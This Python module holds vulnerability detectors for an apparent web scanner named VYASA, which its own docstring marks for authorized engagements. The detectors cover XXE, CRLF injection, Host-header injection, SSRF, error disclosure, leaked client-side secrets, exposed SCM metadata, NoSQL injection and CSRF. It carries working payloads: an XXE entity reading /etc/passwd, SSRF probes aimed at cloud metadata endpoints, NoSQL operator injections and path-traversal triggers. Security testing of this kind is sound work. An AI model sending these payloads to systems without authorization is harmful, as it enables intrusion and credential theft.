"""
Extra confirmation-gated detectors for VYASA (black-box automatable classes).

Each detector returns an ExtraProof with confirmed=True and a "CONFIRMED VIA ..."
evidence string ONLY when a real response proves the issue - never on suspicion.
Covers: XXE, CRLF / response splitting, Host-header injection, reflected SSRF,
verbose error / stack-trace disclosure, secrets in client-side JS, exposed SCM
metadata (.svn/.hg/.bzr), and NoSQL injection (error + operator).

Intended for AUTHORIZED engagements only.
"""

from __future__ import annotations

import re
import time
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple
from urllib.parse import urlparse, urljoin


@dataclass
class ExtraProof:
    confirmed: bool
    vuln_class: str
    technique: str
    evidence: str = ""
    request_summary: str = ""
    response_summary: str = ""
    severity: str = "MEDIUM"
    extras: Dict[str, str] = field(default_factory=dict)


def _get(session, url, timeout, **kw):
    try:
        return session.get(url, timeout=timeout, verify=False, allow_redirects=False, **kw)
    except Exception:
        return None


# ---------------------------------------------------------------------------
# XXE - XML External Entity (INJ-07)
# ---------------------------------------------------------------------------

_XXE_PAYLOAD = (
    '<?xml version="1.0"?>\n'
    '<!DOCTYPE vyasa [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n'
    '<vyasa><data>&xxe;</data></vyasa>'
)
_XXE_WIN = (
    '<?xml version="1.0"?>\n'
    '<!DOCTYPE vyasa [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>\n'
    '<vyasa><data>&xxe;</data></vyasa>'
)


def confirm_xxe(session, base_url: str, endpoints: Optional[List[Dict]] = None,
                timeout: float = 6.0) -> Optional[ExtraProof]:
    """POST an XML external-entity payload to XML-accepting endpoints; confirm if
    the server resolves the entity and reflects /etc/passwd (or win.ini)."""
    targets = [base_url.rstrip("/") + p for p in ("", "/api", "/api/xml", "/xml",
                                                  "/soap", "/upload", "/import", "/parse")]
    for ep in (endpoints or []):
        u = ep.get("sample_url") if isinstance(ep, dict) else None
        if u and u not in targets:
            targets.append(u)

    for url in targets[:10]:
        for payload, marker in ((_XXE_PAYLOAD, "root:x:0:0"), (_XXE_WIN, "[extensions]")):
            try:
                r = session.post(url, data=payload, timeout=timeout, verify=False,
                                 allow_redirects=False,
                                 headers={"Content-Type": "application/xml"})
            except Exception:
                continue
            if r is not None and marker.lower() in (r.text or "").lower():
                return ExtraProof(
                    confirmed=True, vuln_class="XXE", technique="file-disclosure", severity="HIGH",
                    evidence=(f"CONFIRMED VIA XXE: an XML external-entity payload posted to {url} caused the "
                              f"server to read and reflect a local file (matched '{marker}'). The XML parser "
                              f"resolves external entities - readable files, SSRF and DoS are possible."),
                    request_summary=f"POST {url} (XML with SYSTEM entity)",
                    response_summary=f"HTTP {r.status_code}, local file content reflected",
                )
    return None


# ---------------------------------------------------------------------------
# CRLF / HTTP response splitting (INJ-03)
# ---------------------------------------------------------------------------

CRLF_PARAMS = ["url", "redirect", "next", "lang", "locale", "page", "return", "r", "q", "id"]


def confirm_crlf(session, url: str, params: Optional[Dict[str, str]] = None,
                 candidate_params: Optional[List[str]] = None, timeout: float = 6.0,
                 max_params: int = 6) -> Optional[ExtraProof]:
    """Inject CRLF + a marker header into a parameter; confirm the injected header
    appears in the ACTUAL response headers (true response splitting)."""
    marker = "X-Vyasa-Crlf"
    val = "1"
    inj = f"vy%0d%0a{marker}:%20{val}"
    base = dict(params or {})
    names = list(base.keys()) + [p for p in (candidate_params or CRLF_PARAMS) if p not in base]
    for p in names[:max_params]:
        data = dict(base); data[p] = inj
        r = _get(session, url, timeout, params=data)
        if r is None:
            continue
        # requests normalizes header keys; check both header presence and value.
        if r.headers.get(marker) == val or marker.lower() in {k.lower() for k in r.headers}:
            return ExtraProof(
                confirmed=True, vuln_class="CRLF", technique="response-splitting", severity="MEDIUM",
                evidence=(f"CONFIRMED VIA CRLF injection: a CR/LF sequence in parameter '{p}' injected a new "
                          f"response header '{marker}: {val}'. This enables HTTP response splitting, header "
                          f"injection and cache poisoning."),
                request_summary=f"GET {url} ({p}=...%0d%0a{marker}:...)",
                response_summary=f"injected header '{marker}' present in response",
            )
    return None


# ---------------------------------------------------------------------------
# Host header injection / poisoning (INJ-04)
# ---------------------------------------------------------------------------

def confirm_host_header_injection(session, base_url: str, timeout: float = 6.0) -> Optional[ExtraProof]:
    """Send an attacker-controlled Host header; confirm it is reflected in the
    body (absolute links / password-reset URLs) or in a redirect Location."""
    evil = "vyasa-evil.attacker.test"
    try:
        r = session.get(base_url, headers={"Host": evil}, timeout=timeout, verify=False, allow_redirects=False)
    except Exception:
        return None
    if r is None:
        return None
    loc = r.headers.get("Location", "")
    body = r.text or ""
    where = "Location header" if evil in loc else ("response body" if evil in body else None)
    if where:
        return ExtraProof(
            confirmed=True, vuln_class="HostHeader", technique="host-reflection", severity="MEDIUM",
            evidence=(f"CONFIRMED VIA Host-header injection: an attacker-controlled Host '{evil}' was reflected "
                      f"in the {where}. This enables password-reset poisoning, cache poisoning and open-redirect "
                      f"style attacks."),
            request_summary=f"GET {base_url} (Host: {evil})",
            response_summary=f"attacker Host reflected in {where}",
        )
    return None


# ---------------------------------------------------------------------------
# Reflected SSRF (basic / internal) - best-effort without an OOB server
# ---------------------------------------------------------------------------

SSRF_PARAMS = ["url", "uri", "link", "src", "dest", "redirect", "fetch", "image",
               "img", "proxy", "callback", "webhook", "load", "domain", "host", "target"]
_SSRF_TARGETS = [
    ("http://169.254.169.254/latest/meta-data/", ("ami-id", "instance-id", "iam/", "meta-data")),
    ("http://metadata.google.internal/computeMetadata/v1/", ("computeMetadata", "project-id")),
    ("http://127.0.0.1:80/", ("<html", "server", "nginx", "apache")),
]


def confirm_ssrf_reflected(session, url: str, params: Optional[Dict[str, str]] = None,
                           candidate_params: Optional[List[str]] = None, timeout: float = 6.0,
                           max_params: int = 6) -> Optional[ExtraProof]:
    """For URL-accepting parameters, point the server at internal/metadata hosts
    and confirm when internal content is reflected back (reflected SSRF)."""
    base = dict(params or {})
    names = list(base.keys()) + [p for p in (candidate_params or SSRF_PARAMS) if p not in base]
    for p in names[:max_params]:
        for target, markers in _SSRF_TARGETS:
            data = dict(base); data[p] = target
            r = _get(session, url, max(timeout, 8.0), params=data)
            if r is None:
                continue
            low = (r.text or "").lower()
            hit = next((m for m in markers if m.lower() in low), None)
            if hit and r.status_code == 200:
                return ExtraProof(
                    confirmed=True, vuln_class="SSRF", technique="reflected-internal", severity="HIGH",
                    evidence=(f"CONFIRMED VIA SSRF: parameter '{p}' made the server fetch an INTERNAL URL "
                              f"({target}) and reflect its content (matched '{hit}'). The server can be forced "
                              f"to reach internal services / cloud metadata."),
                    request_summary=f"GET {url} ({p}={target})",
                    response_summary=f"internal content '{hit}' reflected",
                )
    return None


# ---------------------------------------------------------------------------
# Verbose error / stack-trace disclosure (INFO-07)
# ---------------------------------------------------------------------------

_STACK_SIGS = [
    "traceback (most recent call last)", "stack trace:", "fatal error:", "warning: ",
    "exception in thread", "at java.", "at org.", "at com.", "system.web", "asp.net",
    "org.springframework", "werkzeug.exceptions", "django.", "nodejs", "node_modules",
    " on line ", "undefined index", "undefined variable", "notice: ", "parse error:",
    "ora-0", "pg::", "psql:", "sqlalchemy", ".php on line", ".py\", line", "line %d",
]
_ERR_TRIGGERS = ["'", '"', "[]", "%00", "%ff", "../", "{{1}}", "\x00", "9" * 40]


def confirm_error_disclosure(session, url: str, params: Optional[Dict[str, str]] = None,
                             timeout: float = 6.0) -> Optional[ExtraProof]:
    """Send malformed input; confirm a stack trace / verbose error leaks internal
    paths, framework internals or source."""
    base = dict(params or {})
    pnames = list(base.keys()) or ["id", "q", "page", "search"]
    for p in pnames[:4]:
        for trig in _ERR_TRIGGERS[:5]:
            data = dict(base); data[p] = (base.get(p, "1") + trig)
            r = _get(session, url, timeout, params=data)
            if r is None:
                continue
            low = (r.text or "").lower()
            hit = next((s for s in _STACK_SIGS if s in low), None)
            if hit and r.status_code >= 500 or (hit and "traceback" in low):
                return ExtraProof(
                    confirmed=True, vuln_class="InfoDisclosure", technique="stack-trace", severity="MEDIUM",
                    evidence=(f"CONFIRMED VIA error disclosure: malformed input in '{p}' triggered a verbose "
                              f"error/stack trace (matched '{hit.strip()}'), leaking framework internals and "
                              f"server file paths that aid further attacks."),
                    request_summary=f"GET {url} ({p}=...{trig})",
                    response_summary=f"HTTP {r.status_code}, stack trace leaked",
                )
    return None


# ---------------------------------------------------------------------------
# Secrets / API keys in client-side JS (INFO-06)
# ---------------------------------------------------------------------------

_SECRET_PATTERNS = [
    ("AWS Access Key", re.compile(r"\bAKIA[0-9A-Z]{16}\b")),
    ("AWS Secret Key", re.compile(r"(?i)aws_secret_access_key\s*[:=]\s*['\"][0-9a-zA-Z/+]{40}['\"]")),
    ("Google API Key", re.compile(r"\bAIza[0-9A-Za-z_\-]{35}\b")),
    ("Stripe Live Key", re.compile(r"\bsk_live_[0-9a-zA-Z]{24,}\b")),
    ("Slack Token", re.compile(r"\bxox[baprs]-[0-9A-Za-z-]{10,}\b")),
    ("GitHub Token", re.compile(r"\bghp_[0-9A-Za-z]{36}\b")),
    ("Private Key Block", re.compile(r"-----BEGIN (?:RSA |EC |OPENSSH |DSA |PGP )?PRIVATE KEY-----")),
    ("Generic API secret", re.compile(r"(?i)(api[_-]?key|secret|token|passwd|password)['\"]?\s*[:=]\s*['\"][0-9a-zA-Z_\-]{16,}['\"]")),
    ("Firebase URL", re.compile(r"https://[a-z0-9.\-]+\.firebaseio\.com")),
]


def scan_asset_secrets(session, base_url: str, js_urls: Optional[List[str]] = None,
                       timeout: float = 6.0, max_files: int = 12) -> Optional[ExtraProof]:
    """Fetch linked JavaScript/asset files and confirm hard-coded secrets."""
    urls = list(dict.fromkeys(js_urls or []))
    if not urls:
        r = _get(session, base_url, timeout)
        if r is not None:
            for m in re.finditer(r'src=["\']([^"\']+\.js[^"\']*)["\']', r.text or "", re.I):
                urls.append(urljoin(base_url, m.group(1)))
    for u in urls[:max_files]:
        r = _get(session, u, timeout)
        if r is None or r.status_code != 200:
            continue
        text = r.text or ""
        for label, rx in _SECRET_PATTERNS:
            m = rx.search(text)
            if m:
                found = m.group(0)
                redacted = found[:6] + "..." + found[-4:] if len(found) > 12 else found[:4] + "..."
                return ExtraProof(
                    confirmed=True, vuln_class="InfoDisclosure", technique="hardcoded-secret", severity="HIGH",
                    evidence=(f"CONFIRMED VIA secret in client asset: a {label} was found hard-coded in {u} "
                              f"('{redacted}'). Anyone viewing the site's JavaScript can read and abuse it."),
                    request_summary=f"GET {u}",
                    response_summary=f"{label} pattern matched in JS",
                    extras={"type": label, "file": u},
                )
    return None


# ---------------------------------------------------------------------------
# Exposed SCM metadata (.svn / .hg / .bzr) (INFO-05)
# ---------------------------------------------------------------------------

_SCM_PATHS = [
    ("/.svn/entries", ("dir", "svn:")),
    ("/.svn/wc.db", ("SQLite format",)),
    ("/.hg/requires", ("revlogv1", "store", "dotencode")),
    ("/.bzr/branch-format", ("Bazaar",)),
    ("/.DS_Store", ("Bud1",)),
]


def confirm_scm_metadata(session, base_url: str, timeout: float = 6.0) -> Optional[ExtraProof]:
    for path, markers in _SCM_PATHS:
        r = _get(session, base_url.rstrip("/") + path, timeout)
        if r is None or r.status_code != 200:
            continue
        text = r.text or ""
        if any(mk.lower() in text.lower() for mk in markers):
            return ExtraProof(
                confirmed=True, vuln_class="InfoDisclosure", technique="scm-metadata", severity="MEDIUM",
                evidence=(f"CONFIRMED VIA exposed SCM metadata: '{path}' is publicly readable and contains "
                          f"source-control data - the full source tree/history may be reconstructable."),
                request_summary=f"GET {path}",
                response_summary=f"HTTP 200, SCM metadata exposed",
            )
    return None


# ---------------------------------------------------------------------------
# NoSQL injection (INJ-14) - error-based + operator differential
# ---------------------------------------------------------------------------

_NOSQL_ERRORS = [
    "mongoerror", "mongodb", "bson", "couldn't parse", "$where", "e11000",
    "unterminated object", "unexpected token", "cast to objectid failed",
    "casterror", "mongoose", "org.mongodb", "pymongo",
]


def confirm_nosql(session, url: str, params: Optional[Dict[str, str]] = None,
                  timeout: float = 6.0, max_params: int = 5) -> Optional[ExtraProof]:
    """Error-based NoSQL injection: a Mongo-style operator / broken object raises
    a NoSQL error signature absent from the clean baseline."""
    base = dict(params or {})
    names = list(base.keys()) or ["id", "username", "user", "q", "search", "filter"]
    for p in names[:max_params]:
        clean = _get(session, url, timeout, params={**base, p: base.get(p, "1")})
        clean_low = (clean.text or "").lower() if clean is not None else ""
        for payload in ("'\"`{", "[$ne]", "[$gt]", '{"$gt":""}'):
            # operator injection via param name (user[$ne]=) and value
            data = {**base}
            if payload.startswith("["):
                data[p + payload] = ""
            else:
                data[p] = base.get(p, "1") + payload
            r = _get(session, url, timeout, params=data)
            if r is None:
                continue
            low = (r.text or "").lower()
            hit = next((s for s in _NOSQL_ERRORS if s in low and s not in clean_low), None)
            if hit:
                return ExtraProof(
                    confirmed=True, vuln_class="NoSQLi", technique="error-based", severity="HIGH",
                    evidence=(f"CONFIRMED VIA NoSQL injection: operator/broken-object input in '{p}' raised a "
                              f"NoSQL error signature ('{hit}') absent from the baseline, proving user input "
                              f"reaches the NoSQL query."),
                    request_summary=f"GET {url} ({p}={payload})",
                    response_summary=f"NoSQL error '{hit}' surfaced",
                )
    return None


# ---------------------------------------------------------------------------
# CSRF - missing anti-CSRF token on state-changing forms (CSRF-01)
# ---------------------------------------------------------------------------

_CSRF_TOKEN_NAMES = re.compile(
    r"(csrf|xsrf|_token|authenticity|anti.?forgery|nonce|verif|requesttoken|__requestverification)",
    re.I)
_STATE_CHANGING_ACTION = re.compile(
    r"(transfer|update|delete|remove|create|add|change|password|passwd|email|settings|"
    r"profile|account|pay|checkout|order|withdraw|logout|admin|comment|post|upload|subscribe|"
    r"register|signup|invite|grant|revoke|reset|confirm)", re.I)


def _cookie_samesite_protected(session, base_url: str, timeout: float) -> bool:
    """True if the base response sets a cookie with SameSite=Lax or Strict (which
    largely mitigates cross-site form POSTs)."""
    r = _get(session, base_url, timeout)
    if r is None:
        return False
    sc = r.headers.get("Set-Cookie", "")
    return bool(re.search(r"samesite\s*=\s*(lax|strict)", sc, re.I))


def confirm_csrf(session, base_url: str, forms: Optional[List[Dict]] = None,
                 timeout: float = 6.0) -> Optional[ExtraProof]:
    """Confirm a CSRF precondition: a state-changing form with NO anti-CSRF token
    while the session cookie is not SameSite-protected. Non-destructive."""
    forms = forms or []
    if not forms:
        return None
    samesite_ok = _cookie_samesite_protected(session, base_url, timeout)
    if samesite_ok:
        return None  # SameSite Lax/Strict blocks cross-site form POST -> not exploitable

    for form in forms:
        if not isinstance(form, dict):
            continue
        method = (form.get("method") or "GET").upper()
        action = form.get("action") or ""
        inputs = form.get("inputs") or []
        names = " ".join((i.get("name") or "") for i in inputs if isinstance(i, dict))

        state_changing = method == "POST" or bool(_STATE_CHANGING_ACTION.search(action))
        if not state_changing:
            continue
        if _CSRF_TOKEN_NAMES.search(names):
            continue  # a token field is present

        return ExtraProof(
            confirmed=True, vuln_class="CSRF", technique="missing-anti-csrf-token", severity="MEDIUM",
            evidence=(f"CONFIRMED VIA CSRF: the state-changing {method} form to '{action or base_url}' carries "
                      f"no anti-CSRF token and the session cookie is not SameSite-protected, so a malicious "
                      f"site can forge this request on a logged-in victim's behalf. Fields: [{names.strip()}]."),
            request_summary=f"{method} form '{action or base_url}' (no CSRF token)",
            response_summary="no token field; cookie SameSite not Lax/Strict",
            extras={"action": action, "method": method},
        )
    return None
